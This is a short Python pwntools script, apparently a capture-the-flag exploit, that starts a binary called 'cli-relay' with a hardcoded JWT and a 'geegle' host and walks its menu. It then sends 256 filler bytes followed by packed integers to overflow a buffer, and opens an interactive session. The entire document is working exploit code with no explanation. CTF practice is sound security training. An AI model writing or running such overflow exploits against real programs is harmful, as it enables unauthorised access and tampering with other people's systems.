#!/usr/bin/env python
from pwn import *

p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkYW1AZ2VlZ2xlLm9yZyIsInNlcnZpY2UiOiJ1YmVycHJveHlAc2VydmljZXMuZ2VlZ2xlLm9yZyIsImV4cCI6MTU3NDYyOTI4OH0.7sEEZmT7tPkw1jlSJwKqsXn6H8cUNKTGdLbOWV2Q_Gk", "game.corp.geegle.org"])
p.sendline('y')
p.sendline('1')
p.sendline('A')
p.sendline('1')
p.sendline('B'*256 + p32(0x02) + p32(0x01))
p.sendline('3')
p.interactive()
